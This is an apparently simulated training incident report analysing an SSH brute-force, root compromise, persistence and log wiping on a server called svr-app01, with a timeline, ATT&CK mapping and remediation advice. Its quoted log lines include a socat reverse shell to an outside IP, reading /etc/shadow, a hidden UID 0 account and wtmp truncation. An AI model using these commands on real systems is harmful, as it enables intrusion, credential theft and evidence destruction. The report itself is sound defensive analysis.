# Incident Report — INC-001: SSH Brute-Force and Root Compromise of svr-app01

| | |
|---|---|
| **Host** | svr-app01 |
| **Date of incident** | 11 September 2026 (log window 11–12 September) |
| **Analyst** | Ali Jama |
| **Date of report** | 16 September 2026 |
| **Classification** | Confirmed intrusion — root compromise, persistence established |
| **Status** | Open — not contained. Containment actions are set out in Section 5. |
| **Evidence source** | `mission-001-auth.log` (SSH, sudo, cron and account-management events) |

> Training exercise completed in a simulated environment. All hostnames, usernames and IP addresses are fictional.

---

## 1. Executive Summary

An external attacker gained administrative control of the application server svr-app01 on the evening of 11 September by repeatedly guessing the password of a backup service account until it succeeded. Once inside, they created a second hidden administrator account, set up their own access credentials so they can return even after the original password is changed, and opened a connection from the server to a system under their control. They then erased the server's login history in an attempt to conceal what they had done.

---

## 2. Timeline of Events

All times are server local time, 11 September 2026. Every row is supported by a line in the authentication log.

| Time | Event | Evidence |
|---|---|---|
| 21:43 – 01:49 | Normal activity throughout the log window: staff logins by SSH key from the internal range 10.20.4.0/24 and scheduled maintenance jobs | Baseline |
| 22:52:02 – 22:52:33 | Attacker probes for valid usernames from 185.243.96.114 — eight non-existent accounts tried in 31 seconds (root, admin, oracle, postgres, ubuntu, test, git, jenkins) | `Invalid user root from 185.243.96.114` |
| 22:56:34 – 22:57:58 | Password-guessing attack against the existing account `svc_backup` — 34 failures in under 90 seconds, with the server dropping the connection three times for exceeding maximum attempts | `Failed password for svc_backup from 185.243.96.114` ×34 |
| 22:58:01 | **Initial access.** Password guessed successfully | `Accepted password for svc_backup from 185.243.96.114` |
| 22:58:49 | Attacker uses sudo to install the networking utility `socat` | `sudo ... COMMAND=/usr/bin/apt-get install -y socat` |
| 22:59:20 | Password hash file read — likely credential theft for offline cracking | `sudo ... COMMAND=/usr/bin/cat /etc/shadow` |
| 22:59:46 | **Second account created:** `sysmon-svc` with UID 0 and GID 0 — full root equivalence, disguised with a plausible monitoring-tool name | `new user: name=sysmon-svc, UID=0, GID=0` |
| 22:59:55 | Password set on the new account | `password changed for sysmon-svc` |
| 23:00:59 | **Persistence confirmed.** Attacker logs in as `sysmon-svc` using public-key authentication, showing their own key is now installed on the server | `Accepted publickey for sysmon-svc from 185.243.96.114` |
| 23:02:59 | **Command and control established.** A cron job owned by `sysmon-svc` launches a reverse shell to 45.147.230.19 on port 8443 | `CRON (sysmon-svc) CMD (/usr/bin/socat TCP:45.147.230.19:8443 EXEC:/bin/bash...)` |
| 23:03:54 | **Anti-forensics.** Login history file emptied | `sudo ... COMMAND=/usr/bin/truncate -s 0 /var/log/wtmp` |

The full intrusion, from first successful login to log tampering, took under six minutes.

---

## 3. Evidence

**Attacker infrastructure**
- `185.243.96.114` — source of all attack activity
- `45.147.230.19:8443` — command-and-control destination

**Accounts involved**
- `svc_backup` — **compromised.** Password guessed; confirmed by a successful authentication from the attacker IP. The account also held sudo rights broad enough to install software and read `/etc/shadow`, which turned a single guessed password into full root access.
- `sysmon-svc` — **attacker-created.** UID 0 / GID 0, meaning it is root-equivalent despite appearing to be a service account.

**Accounts ruled out**

j.okafor, s.pemberton, r.whitlock, d.mensah, a.brennan and t.novak all authenticated by SSH key from internal addresses throughout the log window, with no activity from either attacker IP. The two failed logins from this group (r.whitlock at 23:04:53 and s.pemberton at 00:15:10) were single attempts from internal addresses and are consistent with ordinary typing errors.

**Anomaly investigated and dismissed**

d.mensah authenticated at 23:45:00 from 10.20.9.77, outside the usual 10.20.4.0/24 range, and ran a root command. Assessed as legitimate: the source is internal, authentication was key-based, and the command (`tail -n 200 /var/log/nginx/error.log`) is consistent with an engineer troubleshooting the web server. There is no link to either attacker IP.

---

## 4. Assessment of Impact

**Severity: Critical.**

- **Confidentiality** — `/etc/shadow` was read. Every password hash on the host must be treated as stolen and open to offline cracking, and any of those passwords reused elsewhere is also compromised.
- **Integrity** — Root access was obtained. Nothing on this host can be trusted: binaries, configuration and application code may all have been modified.
- **Availability** — No disruption observed, but the attacker retains the ability to cause it at will.
- **Persistence** — Access does not depend on the guessed password. An attacker-controlled SSH key is installed on a root-equivalent account, and a cron job re-establishes the reverse shell.
- **Evidence loss** — `/var/log/wtmp` was emptied, removing login history. Other logs may also be incomplete.

**Scope uncertainty:** this report covers authentication logs only. Lateral movement to other hosts cannot be ruled out on this evidence and should be assumed until disproven.

---

## 5. Recommendations

**Immediate (within 1 hour)**
1. Isolate svr-app01 from the network. Do not power it off, as volatile memory may hold evidence.
2. Block 185.243.96.114 and 45.147.230.19 at the perimeter firewall, and search all egress logs for other hosts contacting 45.147.230.19.
3. Disable `sysmon-svc` and `svc_backup`.

**Short term (24–72 hours)**

4. Force a password reset across the estate, prioritising any account whose hash existed on this host.
5. Rebuild svr-app01 from known-good media. Do not attempt to clean it, because a root-compromised host cannot be trusted.
6. Audit all hosts for accounts with UID 0, unexpected entries in `authorized_keys` files, and unfamiliar cron jobs.

**Longer term**

7. Disable SSH password authentication estate-wide and require keys.
8. Deploy brute-force protection (fail2ban or equivalent) with alerting on repeated failures from a single source.
9. Apply least privilege to service accounts: restrict sudo rights to the specific commands each account needs.
10. Forward logs to a central SIEM in real time so local deletion cannot destroy the record.
11. Alert on account creation, any new UID 0 account, and outbound connections to previously unseen destinations.

---

## 6. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Credential Access | Brute Force: Password Guessing | T1110.001 | Eight invalid usernames probed, then 34 failed attempts against `svc_backup` |
| Initial Access | External Remote Services | T1133 | Attack conducted over internet-facing SSH |
| Initial Access | Valid Accounts: Local Accounts | T1078.003 | Successful authentication as `svc_backup` |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 | `svc_backup` runs commands as root via sudo |
| Command and Control | Ingress Tool Transfer | T1105 | `apt-get install -y socat` |
| Credential Access | OS Credential Dumping: /etc/passwd and /etc/shadow | T1003.008 | `cat /etc/shadow` |
| Persistence | Create Account: Local Account | T1136.001 | `sysmon-svc` created with UID 0 |
| Persistence | Account Manipulation: SSH Authorized Keys | T1098.004 | Public-key login as `sysmon-svc` |
| Persistence / Execution | Scheduled Task/Job: Cron | T1053.003 | Cron job owned by `sysmon-svc` launching the reverse shell |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | `socat ... EXEC:/bin/bash` |
| Command and Control | Non-Application Layer Protocol | T1095 | Raw TCP reverse shell to 45.147.230.19:8443 |
| Defense Evasion | Indicator Removal: Clear Linux or Mac System Logs | T1070.002 | `truncate -s 0 /var/log/wtmp` |

---

## 7. Analyst Notes — Confidence and Gaps

- **High confidence:** initial access method, compromised account, account creation, persistence mechanism, C2 destination and log tampering. All are directly evidenced in the log.
- **Medium confidence:** that the purpose of reading `/etc/shadow` was credential theft. This is plausible and consistent with the attacker's behaviour, but not proven by these logs. Similarly, the installation of the attacker's SSH key is inferred from the successful public-key login rather than logged directly.
- **Unknown:** whether the attacker moved to other hosts, whether any data was exfiltrated, and how long the C2 channel remained active. Authentication logs alone cannot answer these questions.
- **Evidence limitation:** `/var/log/wtmp` was destroyed, so any conclusion about session duration is unreliable. The attacker did not clear the authentication log itself, which is what made this reconstruction possible — a point in favour of the central log forwarding recommended in Section 5.
